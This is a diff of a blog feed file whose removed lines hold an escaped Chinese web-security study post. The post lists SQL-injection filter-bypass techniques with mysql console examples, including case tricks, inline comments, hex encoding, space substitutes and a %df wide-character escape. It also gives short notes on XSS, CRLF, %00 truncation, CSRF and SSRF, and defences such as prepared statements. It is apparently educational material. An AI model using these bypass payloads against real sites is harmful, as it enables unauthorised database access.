-例如：waf过滤了关键字select，可以尝试使用Select等绕过。&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.00&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;#大小写绕过&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;---------------------&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;内联注释绕过&quot;&gt;内联注释绕过:&lt;/h4&gt;
-&lt;p&gt;内联注释就是把一些特有的仅在MYSQL上的语句放在 /&lt;em&gt;!…&lt;/em&gt;/中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*!select*/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;---------------------&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;双写关键字绕过&quot;&gt;双写关键字绕过:&lt;/h4&gt;
-&lt;p&gt;在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。&lt;/p&gt;
-&lt;h4 id=&quot;特殊编码绕过&quot;&gt;特殊编码绕过:&lt;/h4&gt;
-&lt;p&gt;十六进制绕过&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7465737431&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;test1&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;ascii编码绕过&lt;br /&gt;
-Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)&lt;br /&gt;
-tip:好像新版mysql不能用了&lt;/p&gt;
-&lt;h4 id=&quot;空格过滤绕过&quot;&gt;空格过滤绕过:&lt;/h4&gt;
-&lt;p&gt;一般绕过空格过滤的方法有以下几种方法来取代空格&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;回车&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url编码中的&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tap键上面的按钮&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;tap&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;两个空格&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;实例:&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*/**/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-
-&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#注意括号中不能含有*  &lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;from&lt;/span&gt; 
-    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;users&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;where&lt;/span&gt; 
-    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`id`&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`users`&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`id`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;过滤or-and-xor-not-绕过&quot;&gt;过滤or and xor not 绕过:&lt;/h4&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;and = &amp;amp;&amp;amp;&lt;br /&gt;
-or = ||&lt;br /&gt;
-xor = | # 异或&lt;br /&gt;
-not = !&lt;/p&gt;
-  &lt;h4 id=&quot;过滤等号绕过&quot;&gt;过滤等号=绕过&lt;/h4&gt;
-  &lt;p&gt;#####不加通配符的like执行的效果和=一致，所以可以用来绕过。&lt;br /&gt;
-正常加上通配符的like：&lt;/p&gt;
-  &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test%&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
-  &lt;p&gt;#####使用大小于号来绕过：&lt;/p&gt;
-  &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
-  &lt;h3 id=&quot;如何防御sql漏洞&quot;&gt;如何防御SQL漏洞？&lt;/h3&gt;
-  &lt;p&gt;核心原则：数据代码分离原则。 
-1.最佳方法：预编译语句，绑定变量。使用预编译的SQL语句，SQL的语意不会变化，攻击者无法改变SQL的结构，即使攻击者插入了类似于’or ‘1’=’1的字符串，也只会将此字符串作为username查询。 
-2.从存储过程来防御：先将SQL语句定义在数据库中，存储过程中可能也存在注入问题，应该尽量避免在存储过程中使用动态SQL语句。 
-3.从数据类型角度来防御：限制数据类型，并统一数据格式。 
-4.从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如C语言中的system(),PHP的eval()，JSP的include()导致的代码越权执行，都是注入。 
-5.从数据库管理者角度来防御：的最小权限原则，避免root,dbowner等高权限用户直接连接数据库。&lt;/p&gt;
-  &lt;h3 id=&quot;为什么有的时候没有错误回显用php举例&quot;&gt;为什么有的时候没有错误回显，用php举例&lt;/h3&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。
-在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用。&lt;/p&gt;
-
-&lt;p&gt;宽字符注入的原理？如何利用宽字符注入漏洞，payload如何构造？&lt;/p&gt;
-
-&lt;p&gt;通俗讲，gbk，big5等编码占了两个字节，sql语句进后端后对单引号等进行了转义，转义\为%5C，当前面的%xx与%5C能结合成两个字节的字符时候，就可以使后面的单引号逃逸，从而造成注入。比较常见的gbk，%df’ =&amp;gt;
-%df%5c%27 =&amp;gt; 運’ 。已经可以单引号了，剩下的就和普通注入差不多了。&lt;/p&gt;
-
-&lt;h3 id=&quot;sql的bypass技巧&quot;&gt;sql的bypass技巧&lt;/h3&gt;
-
-&lt;p&gt;这种太多了，网上一搜一大把。主要还是看目标站点的过滤和防护，常见bypass可以是&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;替换空格&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;  
-&lt;span class=&quot;cm&quot;&gt;/*!00000union*/&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;等于union&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;  
-&lt;span class=&quot;nx&quot;&gt;或者利用前端过滤&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;添加尖括号&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;  &amp;gt;'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;。&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;大小写什么的都太常见了&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;如果过滤了函数或者关键字&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;可以尝试其他能达到效果的同等函数&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;关键字比如or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;可以用&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;替换&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;或者用运算符比如&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;达到相同的效果&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;。&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;总之&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;还是看要求&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;。&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;crlf注入的原理&quot;&gt;CRLF注入的原理&lt;/h2&gt;
-
-&lt;p&gt;CRLF是回车+换行的简称。碰得比较少，基本没挖到过这种洞，简而言之一般是可以通过提交恶意数据里面包含回车，换行来达到控制服务器响应头的效果。碰到过潜在的CRLF都是提交回车和换行之后就500了。CRLF的利用可以是XSS，恶意重定向location，还有set-cookie.&lt;/p&gt;
-
-&lt;h2 id=&quot;xss发生的场景&quot;&gt;XSS发生的场景&lt;/h2&gt;
-
-&lt;p&gt;个人理解是对用户提交数据为进行安全的过滤然后直接输入到页面当中，造成js代码的执行。至于具体场景，有输出的地方就有可能被xss的风险。&lt;/p&gt;
-
-&lt;h2 id=&quot;如果给你一个xss盲打漏洞但是返回来的信息显示他的后台在内网并且只能内网访问如何利用这个xss&quot;&gt;如果给你一个XSS盲打漏洞，但是返回来的信息显示，他的后台在内网，并且只能内网访问，如何利用这个xss？&lt;/h2&gt;
-
-&lt;p&gt;github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell.&lt;/p&gt;
-
-&lt;h2 id=&quot;phpini可以设置哪些安全特性&quot;&gt;php.ini可以设置哪些安全特性？&lt;/h2&gt;
-&lt;p&gt;关闭报错，设置open_basedir，禁用危险函数，打开gpc。有具体的文章介绍安全配置这一块，属于运维的工作范围。&lt;/p&gt;
-&lt;h2 id=&quot;php的00截断的原理&quot;&gt;php的%00截断的原理？&lt;/h2&gt;
-&lt;p&gt;存在于5.3.4版本下，一般利用在文件上传时文件名的截断，或者在对文件进行操作时候都有可能存在00阶段的情况。 如filename=test.php%00.txt 会被截断成test.php，00后面的被忽略。系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了。&lt;/p&gt;
-&lt;h2 id=&quot;webshell的检测有哪些方法&quot;&gt;webshell的检测，有哪些方法？&lt;/h2&gt;
-&lt;p&gt;个人知道的大体上分为静态检测和动态检测两种。静态检测比如查找危险函数，如eval，system等。动态检测是检测脚本运行时要执行的动作，比如文件操作，socket操作等。具体方法可以是通过D盾或者其他查杀软件进行查杀，现在也有基于机器学习的webshell识别。&lt;/p&gt;
-&lt;h2 id=&quot;csrf漏洞的本质是什么&quot;&gt;CSRF漏洞的本质是什么？&lt;/h2&gt;
-&lt;p&gt;CSRF即跨站请求伪造，以受害者的身份向服务器发送一个请求。本质上个人觉得是服务端在执行一些敏感操作时候对提交操作的用户的身份校检不到位。&lt;/p&gt;
-&lt;h3 id=&quot;防御csrf都有哪些方法java是如何防御csrf漏洞的token一定有用吗&quot;&gt;防御CSRF都有哪些方法，JAVA是如何防御CSRF漏洞的，token一定有用吗？&lt;/h3&gt;
-&lt;p&gt;防御CSRF一般是加上referer和csrf_token.
-jAVA不太懂。具体可以参考这篇CSRF攻击的CSRF攻击的应对之道&lt;/p&gt;
-&lt;h2 id=&quot;ssrf漏洞判断的方法&quot;&gt;ssrf漏洞判断的方法：&lt;/h2&gt;
-&lt;h3 id=&quot;介绍&quot;&gt;介绍：&lt;/h3&gt;
-&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p&gt;
-&lt;h3 id=&quot;形成的原因&quot;&gt;形成的原因：&lt;/h3&gt;
-&lt;p&gt;由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。&lt;/p&gt;
-</description>
-        <pubDate>Tue, 07 May 2019 04:49:43 +0800</pubDate>
-        <link>http://localhost:4000/2019/05/07/resttudy.html</link>
-        <guid isPermaLink="true">http://localhost:4000/2019/05/07/resttudy.html</guid>
-        
-        <category>WEB</category>
-        
-        <category>ALL</category>
-        
         
         <category>WEB</category>
         
